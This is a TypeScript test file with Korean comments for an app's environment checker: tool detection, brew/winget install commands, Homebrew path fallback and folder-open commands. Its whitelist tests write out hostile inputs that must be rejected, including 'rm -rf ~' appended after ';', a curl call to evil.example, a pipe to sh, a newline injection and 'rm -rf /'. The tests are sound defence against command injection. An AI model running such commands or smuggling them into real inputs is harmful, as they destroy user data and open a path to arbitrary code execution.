/**
 * 환경 점검.
 *
 * 특히 **설치 명령 흰 목록**이 중요하다 — 이 앱은 LAN 에도 열린다. 화면이 보낸
 * 문자열을 그대로 실행하면 '무엇이든 실행하는 구멍' 이 된다.
 */

import { describe, expect, it } from 'vitest';

import {
  ENV_ITEMS,
  checkEnv,
  folderOpenCommand,
  isAllowedCommand,
  pickToolPath,
  platformOf,
  toolCandidates,
} from '../../lib/env-check.ts';

const nothing = (): boolean => false;
const everything = (): boolean => true;

describe('이 PC 가 무엇인가', () => {
  it('node 의 이름을 우리 말로 바꾼다', () => {
    expect(platformOf('darwin')).toBe('mac');
    expect(platformOf('win32')).toBe('win');
    expect(platformOf('linux')).toBe('other');
  });
});

describe('점검', () => {
  it('파일이 있으면 설치된 것으로 본다', () => {
    const found = checkEnv('mac', (p) => p === '/Applications/OBS.app', nothing);
    expect(found.find((one) => one.id === 'obs')!.installed).toBe(true);
  });

  it('없으면 설치 안 된 것으로 본다', () => {
    const found = checkEnv('mac', nothing, nothing);
    expect(found.find((one) => one.id === 'obs')!.installed).toBe(false);
  });

  /** 설치 도구가 없으면 명령을 주지 않는다 — 없는 명령을 권하면 눌러도 실패한다 */
  it('설치 도구가 없으면 명령을 주지 않는다', () => {
    const found = checkEnv('mac', nothing, nothing);
    expect(found.find((one) => one.id === 'obs')!.command).toBeUndefined();
    // 대신 공식 페이지는 늘 있다
    expect(found.find((one) => one.id === 'obs')!.homepage).toContain('obsproject.com');
  });

  it('설치 도구가 있으면 명령을 준다', () => {
    const found = checkEnv('mac', nothing, (tool) => tool === 'brew');
    const obs = found.find((one) => one.id === 'obs')!;
    expect(obs.tool).toBe('brew');
    expect(obs.command).toBe('brew install --cask obs');
  });

  /** 이미 있는 것에 설치 명령을 붙이면 눌러서 두 번 설치하게 된다 */
  it('이미 설치됐으면 명령을 주지 않는다', () => {
    const found = checkEnv('mac', everything, everything);
    expect(found.every((one) => one.command === undefined)).toBe(true);
  });

  /** 리눅스 등 — 경로도 명령도 없다. 그래도 무너지지 않고 목록은 나와야 한다 */
  it('모르는 플랫폼에서도 목록은 나온다', () => {
    const found = checkEnv('other', nothing, everything);
    expect(found).toHaveLength(ENV_ITEMS.length);
    expect(found.every((one) => one.command === undefined)).toBe(true);
  });

  it('없어도 되는 것과 꼭 필요한 것을 구분한다', () => {
    const found = checkEnv('mac', nothing, nothing);
    expect(found.find((one) => one.id === 'obs')!.optional).toBe(false);
    expect(found.find((one) => one.id === 'chrome')!.optional).toBe(true);
  });
});

/**
 * **이것이 이 파일에서 가장 중요한 검사다.**
 *
 * 목록에 적힌 명령과 글자까지 같을 때만 실행한다. 조금이라도 다르면 거절해야
 * 한다 — 뒤에 무엇을 이어 붙이든 통과하면 안 된다.
 */
describe('설치 명령 흰 목록', () => {
  it('목록에 있는 명령은 통과한다', () => {
    expect(isAllowedCommand('brew install --cask obs')).toBe(true);
    expect(isAllowedCommand('winget install --id OBSProject.OBSStudio -e')).toBe(true);
  });

  it('뒤에 무엇을 붙여도 거절한다', () => {
    expect(isAllowedCommand('brew install --cask obs; rm -rf ~')).toBe(false);
    expect(isAllowedCommand('brew install --cask obs && curl evil.example')).toBe(false);
    expect(isAllowedCommand('brew install --cask obs | sh')).toBe(false);
    expect(isAllowedCommand('brew install --cask obs\nrm -rf ~')).toBe(false);
  });

  it('다른 꾸러미를 넣으려 해도 거절한다', () => {
    expect(isAllowedCommand('brew install --cask 아무거나')).toBe(false);
    expect(isAllowedCommand('brew install obs')).toBe(false);
  });

  it('아예 다른 명령은 거절한다', () => {
    expect(isAllowedCommand('rm -rf /')).toBe(false);
    expect(isAllowedCommand('')).toBe(false);
    expect(isAllowedCommand('sh')).toBe(false);
  });

  /** 목록에 적은 명령은 전부 통과해야 한다 — 하나라도 막히면 그 단추가 죽는다 */
  it('목록의 모든 명령이 통과한다', () => {
    for (const item of ENV_ITEMS) {
      for (const install of Object.values(item.install)) {
        expect(isAllowedCommand(install.command), install.command).toBe(true);
      }
    }
  });
});

/**
 * **설치판의 `PATH` 에서도 설치 도구를 찾는다** (점검 P-5, 2026-09-07 실측).
 *
 * Finder·독으로 띄운 맥 앱의 프로세스 환경을 직접 읽어 보니 이랬다:
 *
 * ```
 * PATH=/usr/bin:/bin:/usr/sbin:/sbin
 * ```
 *
 * Homebrew 는 `/opt/homebrew/bin/brew` 에 **분명히 있는데**(6.0.18) 그 목록에
 * `/opt/homebrew/bin` 이 없어서 `which brew` 가 실패한다. 그러면 화면이
 * '설치 도구가 없습니다 → 공식 페이지' 로 떨어져, 한 번 누르면 되는 일을 사람이
 * 손으로 받아 설치하게 된다.
 *
 * **터미널로 돌릴 때는 셸의 `PATH` 를 물려받아 이 문제가 없다** — 설치판에서만
 * 나타나므로 만든 사람은 끝까지 모른다.
 */
describe('pickToolPath — 설치판의 좁은 PATH 를 견딘다', () => {
  const noFile = () => false;
  const brewAtHomebrew = (path: string) => path === '/opt/homebrew/bin/brew';
  const brewAtUsrLocal = (path: string) => path === '/usr/local/bin/brew';

  it('which 가 찾으면 그것을 쓴다 — 사용자가 다른 자리에 두었을 수 있다', () => {
    expect(pickToolPath('brew', 'mac', '/somewhere/else/brew\n', noFile)).toBe('/somewhere/else/brew');
  });

  it('which 가 실패해도 애플 실리콘 자리를 찾는다 (★ 이것이 P-5 다)', () => {
    expect(pickToolPath('brew', 'mac', undefined, brewAtHomebrew)).toBe('/opt/homebrew/bin/brew');
  });

  it('인텔 맥 자리도 찾는다', () => {
    expect(pickToolPath('brew', 'mac', undefined, brewAtUsrLocal)).toBe('/usr/local/bin/brew');
  });

  it('정말 없으면 undefined — 그때는 공식 페이지로 안내하는 것이 맞다', () => {
    expect(pickToolPath('brew', 'mac', undefined, noFile)).toBeUndefined();
  });

  it('which 가 빈 줄만 주면 후보로 넘어간다', () => {
    expect(pickToolPath('brew', 'mac', '   \n', brewAtHomebrew)).toBe('/opt/homebrew/bin/brew');
    expect(pickToolPath('brew', 'mac', '', brewAtHomebrew)).toBe('/opt/homebrew/bin/brew');
  });

  it('where 가 여러 줄을 주면 첫 줄을 쓴다 (윈도우)', () => {
    const output = 'C:\\a\\winget.exe\nC:\\b\\winget.exe';
    expect(pickToolPath('winget', 'win', output, noFile)).toBe('C:\\a\\winget.exe');
  });

  it('윈도우 후보는 LOCALAPPDATA 를 쓴다 — 없으면 후보도 없다', () => {
    const env = { LOCALAPPDATA: 'C:\\Users\\me\\AppData\\Local' };
    const expected = 'C:\\Users\\me\\AppData\\Local\\Microsoft\\WindowsApps\\winget.exe';
    expect(toolCandidates('winget', 'win', env)).toEqual([expected]);
    expect(toolCandidates('winget', 'win', {})).toEqual([]);
  });

  it('모르는 도구·플랫폼에는 후보를 만들지 않는다', () => {
    expect(toolCandidates('brew', 'win')).toEqual([]);
    expect(toolCandidates('winget', 'mac')).toEqual([]);
    expect(toolCandidates('무엇', 'mac')).toEqual([]);
  });

  it('후보 경로는 **목록에 있는 도구 이름**과 짝이 맞는다', () => {
    // ENV_ITEMS 가 권하는 도구에 후보가 하나도 없으면 설치판에서 못 찾는다
    const tools = new Set(
      ENV_ITEMS.flatMap((item) => Object.entries(item.install).map(([platform, install]) =>
        [platform as 'mac' | 'win', install.tool] as const)),
    );
    for (const [platform, tool] of tools) {
      expect(toolCandidates(tool, platform, { LOCALAPPDATA: 'C:\\x' }).length, `${platform}/${tool}`)
        .toBeGreaterThan(0);
    }
  });
});

/**
 * '데이터 폴더 열기' 는 설치판 사용자가 **백업을 챙기고 배경 그림을 넣는 유일한 길**이다
 * (포장한 앱의 데이터는 `Application Support`·`AppData` 안이라 찾아갈 수 없다).
 *
 * 그런데 명령이 라우트 안에 있을 때는 **지금 도는 PC 의 줄만** 밟혔다. 맥에서
 * 검사하면 윈도우 줄은 확인되지 않고, 틀린 것은 설치판을 받은 사람이 눌러 보고서야
 * 드러난다 — 우리에게는 재현할 방법조차 없다. 그래서 판단을 여기로 옮겼다.
 */
describe('파일 탐색기를 여는 명령', () => {
  it('플랫폼마다 다르다', () => {
    expect(folderOpenCommand('mac')).toBe('open');
    expect(folderOpenCommand('win')).toBe('explorer');
    expect(folderOpenCommand('other')).toBe('xdg-open');
  });

  /** `process.platform` 에서 바로 이어진다 — 중간에 이름이 어긋나면 안 된다 */
  it('노드가 말하는 이름에서 곧바로 이어진다', () => {
    expect(folderOpenCommand(platformOf('darwin'))).toBe('open');
    expect(folderOpenCommand(platformOf('win32'))).toBe('explorer');
    expect(folderOpenCommand(platformOf('linux'))).toBe('xdg-open');
    // 모르는 운영체제에서도 무언가는 시도한다 — 빈 명령을 돌리면 무엇이 틀렸는지 모른다
    expect(folderOpenCommand(platformOf('freebsd')).length).toBeGreaterThan(0);
  });
});
